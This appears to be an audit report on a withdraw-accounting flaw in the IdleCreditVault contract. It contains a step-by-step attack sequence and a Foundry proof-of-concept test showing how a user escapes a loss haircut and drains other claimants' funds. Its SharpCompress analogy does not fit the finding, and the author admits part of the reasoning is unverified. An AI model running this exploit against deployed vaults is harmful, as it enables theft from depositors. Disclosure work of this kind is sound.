### Title
Loss-adjusted withdraw receipts escape their epoch haircut when a later request overwrites `lastWithdrawRequest` — ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
`IdleCreditVault` records each withdraw receipt per epoch in `withdrawsRequestsByEpoch[_user][epoch]`, but the loss-adjusted claim path looks up the haircut `lossRecoveryPriceByEpoch` only under `lastWithdrawRequest[_user]` — a single scalar that is overwritten by every new `requestWithdraw`. When a stop epoch ends in a partial (`stopEpochWithDuration`) loss, `collectWithdrawFunds` stores a recovery price under the epoch key and zeroes `pendingWithdraws`, meaning all receipts of that epoch must be paid at `basis * recoveryPrice`. A user who files a second withdraw request in any later epoch moves `lastWithdrawRequest` past the loss epoch, so `_claimLossAdjustedWithdrawRequest` finds `lossRecoveryPriceByEpoch[newEpoch] == 0`, skips the haircut entirely, and `_claimFundedWithdrawRequest` pays the aggregate `withdrawsRequests[_user]` (which still contains the haircutted receipt) at par via `_transferFundedClaim`. The excess is paid out of underlying that was funded for *all* loss-epoch claimants, so the remaining claimants' receipts become unpayable.

This mirrors the SharpCompress bug class: a containment check keyed on a prefix/marker (`destinationFileName.StartsWith(dir)`) without enforcing the boundary (trailing separator). Here the check is "receipt belongs to the loss epoch," but the boundary is enforced only on the *latest* request epoch, letting a sibling-epoch receipt slip through.

### Finding Description
- `requestWithdraw` tags the receipt to `currentEpoch` and unconditionally sets `lastWithdrawRequest[_user] = currentEpoch` (IdleCreditVault.sol:282, 292–293).
- On a partial loss, `collectWithdrawFunds` is called with `_amount < pendingBasis`; it stores `lossRecoveryPriceByEpoch[epochNumber] = _amount * 1e18 / pendingBasis` and sets `pendingWithdraws = 0` (IdleCreditVault.sol:414–421). The strategy therefore holds only `recoveryPrice * basis` for that epoch's claimants.
- In `claimWithdrawRequest`, `_claimLossAdjustedWithdrawRequest` derives the epoch to check from `lastWithdrawRequest[_user]` (line 790). If the user made any subsequent request in a later epoch, `lossRecoveryPriceByEpoch[lastWithdrawRequest]` is 0 and the function returns early — the loss-epoch portion of `withdrawsRequestsByEpoch[_user][lossEpoch]` is never cleared or haircutted.
- `_claimFundedWithdrawRequest` then pays `withdrawsRequests[_user]` — the aggregate across *all* epochs, including the under-funded loss-epoch receipt — at 100% par, and `_transferFundedClaim` transfers it as long as the strategy's balance minus the (zero in this scenario) `defaultRecoveryReserve` suffices (lines 326–349, 897–906).

Attack sequence (normal epochs, loss-capable mode):
1. Epoch N running. Attacker (holds e.g. half of AA tranche) calls `requestWithdraw` for part of their balance → receipt basis `B_A`. Victim requests `B_V`.
2. Manager calls `stopEpochWithDuration`/`stopEpoch` realizing a loss; `collectWithdrawFunds` pulls only `p * (B_A + B_V)` into the strategy and sets `lossRecoveryPriceByEpoch[N] = p < 1`.
3. In epoch N+1 the attacker calls `requestWithdraw` again with a small amount (they kept residual tranche tokens) → `lastWithdrawRequest[attacker] = N+1`.
4. After epoch N+1 ends, `claimWithdrawRequest`: funded-claim guard passes (`epochNumber > N+1`), loss-adjusted path looks up epoch N+1 → no haircut, funded path pays `B_A + B_A2` **at par**.
5. The attacker receives `B_A` un-haircutted; the strategy's loss-epoch pool was only funded with `p * (B_A + B_V)`, so the victim's `p * B_V` claim (and other funded claims) are left under-collateralized.

### Impact Explanation
Direct theft plus insolvency: the attacker extracts `(1 - lossRecoveryPrice) * B_A` more than entitled, paid from the shared loss-adjusted pool. Loss-epoch claimants who correctly route through `_claimLossAdjustedWithdrawRequest` (those who did not re-request) later find the strategy balance insufficient and their funded claims unpayable. The "loss waterfall" invariant (partial losses socialized pro-rata across pending receipts) and "one receipt one payout" are both broken. Quantified worst case: if the attacker's receipt is the entire pending basis, they recover 100% of a receipt the protocol only funded at `p`, and the residual `(1-p) * basis` is pure theft from other claimants/fee reserve.

### Likelihood Explanation
Medium. The trigger requires an epoch that ends in a partial realized loss (`collectWithdrawFunds` with `_amount < pendingBasis`, i.e. `stopEpochWithDuration` loss mode where the borrower repays less than the pending basis), plus the attacker holding residual tranche tokens to file a trivial second request in a later epoch. No privileged role is needed — the attacker is an ordinary KYC'd tranche holder. The sequence costs one extra request and one epoch of waiting. Guards that exist (`_transferFundedClaim`'s reserve guard, epoch gating, `_onlyIdleCDO`) do not stop it: the reserve guard only protects `defaultRecoveryReserve`, not the loss-adjusted funded pool, and the epoch gating passes once the second epoch ends. One caveat: the stored key for `lossRecoveryPriceByEpoch` uses `epochNumber` at `collectWithdrawFunds` time, while `lastWithdrawRequest` uses the request-time `epochNumber`; I did not fully verify the increment ordering inside `stopEpoch`/`deposit`, but the overwrite of the single `lastWithdrawRequest` scalar breaks the lookup regardless of any constant offset.

### Recommendation
Track the loss-adjusted claim per request epoch instead of relying on the mutable `lastWithdrawRequest` marker. In `_claimLossAdjustedWithdrawRequest`, iterate (or track) all epochs in which the user has a nonzero `withdrawsRequestsByEpoch`/`apr0` entry with a nonzero `lossRecoveryPriceByEpoch`, or maintain a `firstUnclaimedLossEpoch`/`lossEpochMask` per user that survives subsequent requests. Alternatively, block new `requestWithdraw` calls while the user has an unclaimed loss-adjusted receipt, or eagerly clear/settle loss-epoch receipts at `requestWithdraw` time before recording the new epoch. Ensure the sum of per-epoch cleared bases is what decrements `withdrawsRequests[_user]`, not the other way around.

### Proof of Concept
Foundry sketch (extends the existing `test/foundry/IdleCreditVault.t.sol` harness; manager/owner/borrower calls are honest sequencing only):

```solidity
function testLossReceiptEscapeViaLaterRequest() external {
  _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());
  address attacker = makeAddr('attacker');
  address victim   = makeAddr('victim');

  // both deposit, keep extra tranche tokens on the attacker for the 2nd request
  _depositWithUser(attacker, 10_000 * ONE_SCALE, true);
  _depositWithUser(victim,   10_000 * ONE_SCALE, true);
  _startEpochAndCheckPrices(0);

  // epoch 0 ends; both request withdraws for half their balances
  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(initialProvidedApr, _expectedFundsEndEpoch());

  vm.prank(attacker);
  uint256 basisA = cdoEpoch.requestWithdraw(
      IERC20(AAtranche).balanceOf(attacker) / 2, address(AAtranche));
  vm.prank(victim);
  uint256 basisV = cdoEpoch.requestWithdraw(0, address(AAtranche));

  IdleCreditVault vault = IdleCreditVault(address(strategy));
  uint256 reqEpoch = vault.epochNumber();

  _startEpochAndCheckPrices(1);

  // epoch 1 ends with a PARTIAL LOSS on pending receipts:
  // borrower funds only 50% of pendingWithdraws
  vm.warp(cdoEpoch.epochEndDate() + 1);
  uint256 pending = vault.pendingWithdraws();           // basisA + basisV (+interest)
  uint256 funded  = pending / 2;
  deal(defaultUnderlying, borrower, _expectedFundsEndEpoch() + funded - pending);
  vm.prank(manager);
  cdoEpoch.stopEpochWithDuration(cdoEpoch.epochDuration(), initialProvidedApr, /*loss*/ pending - funded);

  assertLt(vault.lossRecoveryPriceByEpoch(reqEpoch), 1e18, 'loss price stored');

  // attacker files a SECOND small withdraw request in a later epoch
  // -> lastWithdrawRequest[attacker] is overwritten past the loss epoch
  _startEpochAndCheckPrices(2);
  vm.prank(attacker);
  cdoEpoch.requestWithdraw(1, address(AAtranche));      // dust request

  // run epoch 2 and 3 normally so the funded-claim gate opens
  vm.warp(cdoEpoch.epochEndDate() + 1);
  deal(defaultUnderlying, borrower, _expectedFundsEndEpoch());
  vm.prank(manager);
  cdoEpoch.stopEpoch(initialProvidedApr, _expectedFundsEndEpoch());
  _startEpochAndCheckPrices(3);
  vm.warp(cdoEpoch.epochEndDate() + 1);
  deal(defaultUnderlying, borrower, _expectedFundsEndEpoch());
  vm.prank(manager);
  cdoEpoch.stopEpoch(initialProvidedApr, _expectedFundsEndEpoch());

  // attacker claims: loss-adjusted path skips (keyed on the NEW epoch),
  // funded path pays the full aggregate basis at par
  uint256 balPre = underlying.balanceOf(attacker);
  vm.prank(attacker);
  cdoEpoch.claimWithdrawRequest();
  uint256 paid = underlying.balanceOf(attacker) - balPre;

  uint256 entitled = basisA * vault.lossRecoveryPriceByEpoch(reqEpoch) / 1e18;
  assertGt(paid, entitled, 'attacker escaped the loss haircut');
  // paid ~= basisA + dust at par; the shortfall comes from the victim's
  // share of the loss-adjusted pool -> victim's claim now reverts/underpays
}
```

The assertion `paid > entitled` demonstrates the broken invariant: a receipt tagged to a loss epoch is paid at par because the haircut lookup is keyed on the user's *latest* request epoch rather than on each receipt's own epoch.
